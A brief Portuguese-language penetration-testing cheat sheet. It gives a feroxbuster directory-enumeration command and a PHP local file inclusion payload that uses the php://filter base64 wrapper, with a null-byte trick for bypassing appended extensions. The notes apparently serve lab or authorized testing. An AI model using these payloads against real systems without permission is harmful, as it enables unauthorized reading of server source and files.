Enumeração de diretórios e arquivos:  
`feroxbuster -u http://$RHOST/ -A -r -x txt -q -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -C 404 --dont-scan 'manual'`  

## PHP  
Erro de include em PHP, faça o teste com filter para converter o arquivo em Base64:  
`http://$RHOST/?param=php://filter/read=convert.base64-encode/resource=[LFI]`  
Para ignorar a extensão no final da URL caso a mesma seja adicionada automaticamente, utilize Null Byte:  
`%00`